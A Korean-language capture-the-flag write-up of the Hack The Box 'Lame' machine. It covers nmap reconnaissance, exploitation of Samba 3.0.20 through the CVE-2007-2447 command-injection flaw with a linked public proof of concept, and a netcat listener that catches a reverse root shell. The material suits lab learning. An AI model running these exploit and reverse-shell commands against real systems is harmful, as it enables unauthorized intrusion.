# HTB-LAME
```bash
OS: Linux
DATE: 26.11.24
DIFFICULTY: Easy
```

## RECON
초기 정찰을 위해 nmap으로 전체 포트 스캔과 상세 포트 스캔을 진행하였다.
```bash
nmap -p- -T4 IP | grep -oP '^\d+/tcp' | cut -d/ -f1 | paste -sd,
```
```bash
nmap -sC -sV -p 21,22,139,445,3632 IP | tee nmap
```
이를 통해 21(FTP)과 445(SMB) 서비스가 열려 있음을 확인하였고, SMB 서비스가 **Samba smbd 3.0.20-Debian** 버전이라는 것도 알 수 있었다.

## Exploit
Samba 버전을 확인한 뒤 관련 exploit을 검색한 결과, **CVE-2007-2447** RCE 취약점이 존재한다는 것을 알게 되었다. 이에 [PoC](https://github.com/abdulsaabir/CVE-2007-2447)를 찾아 exploit을 진행하였다.

먼저 가상환경을 구축하고 필요한 라이브러리를 설치하였다.
```bash
python3 -m venv exploit_env
```
```bash
source exploit_env/bin/activate
```
```bash
pip install -r requirements.txt
```
이후 리스닝 포트를 열어두고 exploit을 실행하였다.
```bash
rlwrap nc -nlvp 4444
```
```bash
python3 usermap_script_Command_Execution.py RHOST_IP 139 LHOST_IP 4444
```
그 결과 별도의 권한 상승 과정 없이 곧바로 root 권한 셸을 획득할 수 있었다.

![user](attach_real/Pasted%20image%2020261124140042.png)

![root](attach_real/Pasted%20image%2020261124135959.png)

## New Info
- `venv`로 exploit 실행 환경을 격리하여 PEP 668(externally-managed) 제약 없이 의존성을 설치하는 방법을 익혔다.
- CVE-2007-2447은 Samba의 `username map script` 설정에서 username 필드에 입력된 값이 셸 명령으로 실행되는 **커맨드 인젝션** 취약점이다.
- Lame은 Samba 서비스가 **root 권한으로 구동**되어, exploit 성공 시 권한 상승 단계 없이 즉시 root 셸을 얻을 수 있었다.